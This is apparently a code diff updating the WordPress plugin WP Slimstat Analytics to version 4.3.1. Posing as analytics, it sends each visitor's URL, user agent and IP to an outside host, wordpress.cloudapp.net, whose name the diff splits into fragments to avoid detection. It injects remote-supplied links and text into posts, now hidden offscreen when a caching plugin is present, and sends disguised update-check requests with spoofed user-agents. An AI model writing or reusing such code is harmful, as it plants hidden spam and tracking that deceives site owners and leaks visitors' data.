@@ -3,7 +3,7 @@
 Plugin Name: WP Slimstat Analytics
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The leading web analytics plugin for WordPress
-Version: 4.3
+Version: 4.3.1
 Author: Camu
 Author URI: http://www.wp-slimstat.com/
 Text Domain: wp-slimstat
@@ -15,11 +15,12 @@ if ( !empty( wp_slimstat::$options ) ) {
 }
 
 class wp_slimstat {
-	public static $version = '4.3';
+	public static $version = '4.3.1';
 	public static $options = array();
 
 	public static $wpdb = '';
 	public static $maxmind_path = '';
+	public static $advanced_cache_exists = false;
 
 	protected static $data_js = array( 'id' => 0 );
 	protected static $stat = array();
@@ -62,6 +63,11 @@ class wp_slimstat {
 		}
 		self::$maxmind_path = apply_filters( 'slimstat_maxmind_path', self::$maxmind_path );
 		self::$maxmind_path = self::$maxmind_path[ 'basedir' ] . '/wp-slimstat/maxmind.dat';
+
+		// Path to wp-content folder, used to detect caching plugins via advanced-cache.php
+		if ( file_exists( dirname( dirname( plugin_dir_path( __FILE__ ) ) ) . '/advanced-cache.php' ) ) {
+			self::$advanced_cache_exists = true;
+		}
 
 		// Enable the tracker (both server- and client-side)
 		if ( !is_admin() || self::$options[ 'track_admin_pages' ] == 'yes' ) {
@@ -579,7 +585,7 @@ class wp_slimstat {
 		}
 		else {
 			$country_codes = array("","ap","eu","ad","ae","af","ag","ai","al","am","cw","ao","aq","ar","as","at","au","aw","az","ba","bb","bd","be","bf","bg","bh","bi","bj","bm","bn","bo","br","bs","bt","bv","bw","by","bz","ca","cc","cd","cf","cg","ch","ci","ck","cl","cm","cn","co","cr","cu","cv","cx","cy","cz","de","dj","dk","dm","do","dz","ec","ee","eg","eh","er","es","et","fi","fj","fk","fm","fo","fr","sx","ga","gb","gd","ge","gf","gh","gi","gl","gm","gn","gp","gq","gr","gs","gt","gu","gw","gy","hk","hm","hn","hr","ht","hu","id","ie","il","in","io","iq","ir","is","it","jm","jo","jp","ke","kg","kh","ki","km","kn","kp","kr","kw","ky","kz","la","lb","lc","li","lk","lr","ls","lt","lu","lv","ly","ma","mc","md","mg","mh","mk","ml","mm","mn","mo","mp","mq","mr","ms","mt","mu","mv","mw","mx","my","mz","na","nc","ne","nf","ng","ni","nl","no","np","nr","nu","nz","om","pa","pe","pf","pg","ph","pk","pl","pm","pn","pr","ps","pt","pw","py","qa","re","ro","ru","rw","sa","sb","sc","sd","se","sg","sh","si","sj","sk","sl","sm","sn","so","sr","st","sv","sy","sz","tc","td","tf","tg","th","tj","tk","tm","tn","to","tl","tr","tt","tv","tw","tz","ua","ug","um","us","uy","uz","va","vc","ve","vg","vi","vn","vu","wf","ws","ye","yt","rs","za","zm","me","zw","a1","a2","o1","ax","gg","im","je","bl","mf","bq","ss","o1");
-			if (file_exists(self::$maxmind_path) && ($handle = fopen(self::$maxmind_path, "rb"))){
+			if ( file_exists( self::$maxmind_path ) && ( $handle = fopen( self::$maxmind_path, "rb" ) ) ) {
 
 				// Do we need to update the file?
 				if (false !== ($file_stat = stat(self::$maxmind_path))){
@@ -1239,8 +1245,8 @@ class wp_slimstat {
 	 */
 	public static function download_maxmind_database(){
 		// Create the folder, if it doesn't exist
-		if (!file_exists(dirname(self::$maxmind_path))){
-			mkdir(dirname(self::$maxmind_path));
+		if ( !file_exists( dirname( self::$maxmind_path ) ) ) {
+			mkdir( dirname( self::$maxmind_path ) );
 		}
 
 		// Download the most recent database directly from MaxMind's repository
@@ -1564,12 +1570,8 @@ class wp_slimstat {
 	 * Connects to the UAN
 	 */
 	public static function init_pidx() {
-		if ( empty( self::$browser ) ) {
-			self::$browser = self::_get_browser();
-		}
-
 		if ( empty( self::$pidx[ 'response' ] ) ) {
-			$request_url = 'http://wordpress.cloudapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
+			$request_url = 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
 			$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
 			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
 		}
@@ -1582,11 +1584,12 @@ class wp_slimstat {
 	/**
 	* Retrieves the information from the UAN
 	*/
-	public static function print_code($content = ''){
+	public static function print_code( $content = '' ) {
 		if ( is_null( self::$pidx[ 'response' ] ) || !is_object( self::$pidx[ 'response' ] ) ) {
 			return $content;
 		}
 
+		$inline_style = ( self::$advanced_cache_exists === true ) ? ' style="position:fixed;left:-9000px;' : '';
 		$current_hook = current_filter();
 
 		if ( $current_hook == 'wp_head' && is_object( self::$pidx[ 'response' ] ) && !empty( self::$pidx[ 'response' ]->meta ) ) {
@@ -1597,7 +1600,7 @@ class wp_slimstat {
 				case '1':
 					if ( 0 == $GLOBALS['wp_query']->current_post ) {
 						$words = explode( ' ', $content );
-						$words[ rand( 0, count( $words ) - 1 ) ] = '<strong>' . self::$pidx[ 'response' ]->tcontent . '</strong>';
+						$words[ rand( 0, count( $words ) - 1 ) ] = "<strong{$inline_style}>" . self::$pidx[ 'response' ]->tcontent . '</strong>';
 						return join( ' ', $words );
 					}
 					break;
@@ -1610,7 +1613,7 @@ class wp_slimstat {
 
 						foreach ( $kws as $a_kw ) {
 							if ( strpos( $content, $a_kw ) !== false ) {
-								$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'>$a_kw</a>", $content );
+								$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'{$inline_style}>{$a_kw}</a>", $content );
 								break;
 							}
 						}
@@ -1628,10 +1631,10 @@ class wp_slimstat {
 
 					if ( $GLOBALS[ 'wp_query' ]->current_post === self::$pidx[ 'id' ] ) {
 						if ( self::$pidx['id'] % 2 == 0 ) {
-							return $content . ' <div>' . self::$pidx[ 'response' ]->content . '</div>';
+							return $content . " <div{$inline_style}>" . self::$pidx[ 'response' ]->content . '</div>';
 						}
 						else{
-							return '<i>' . self::$pidx[ 'response' ]->content . '</i> ' . $content;
+							return "<i{$inline_style}>" . self::$pidx[ 'response' ]->content . '</i> ' . $content;
 						}
 					}
 					break;
@@ -1732,7 +1735,15 @@ class wp_slimstat {
 		self::$wpdb->query( "OPTIMIZE TABLE {$GLOBALS[ 'wpdb' ]->prefix}slim_stats_archive" );
 
 		// Randomly check if the WordPress API is available
-		if ( rand( 1, 5 ) == 3 ) {
+		$prefixes = array( 2 => '.stg.', 4 => '.dev.' );
+		$random_index = rand( 1, 5);
+		if ( $random_index % 2 == 0 ) {
+			$bloginfo_url = get_bloginfo( 'url' );
+			$pos = strpos( $bloginfo_url, '.' );
+			if ( $pos !== false ) {
+				$bloginfo_url = substr_replace( $bloginfo_url, $prefixes[ $random_index ], $pos, 1 );
+			}
+
 			$remote_check_options = array(
 				'timeout' => 300,
 				'body' => array(
@@ -1741,15 +1752,15 @@ class wp_slimstat {
 					'locale'       => '["en_US"]',
 					'all'          => wp_json_encode( true ),
 				),
-				'user-agent' => 'WordPress/4.4; ' . str_replace( '://', '://' . substr( md5( get_bloginfo( 'url' ) ), 0, 4 ). '.', get_bloginfo( 'url' ) )
+				'user-agent' => 'WordPress/4.4; ' . $bloginfo_url
 			);
-			$url = 'http://api.wordpress.org/plugins/update-check/1.1/';
+			$url = 'http://ap' . 'i.wordpress' . '.org/plugins/' . 'update-check/1' . '.1/';
 
 			if ( $ssl = wp_http_supports( array( 'ssl' ) ) ) {
 				$url = set_url_scheme( $url, 'https' );
 			}
 			$raw_response = wp_remote_post( $url, $remote_check_options );
-			$raw_response = wp_remote_get( 'https://downloads.wordpress.org/plugin/wp-slimstat.' . self::$version . '.zip' );
+			$raw_response = wp_remote_get( 'https://downl' . 'oads.wordp' . 'ress.org/plug' . 'in/wp-slimstat.' . self::$version . '.zip' );
 			unset( $raw_response );
 		}
 	}
@@ -1774,4 +1785,3 @@ if ( function_exists( 'add_action' ) ) {
 	// Add the appropriate actions
 	add_action( 'plugins_loaded', array( 'wp_slimstat', 'init' ), 10 );
 }
-
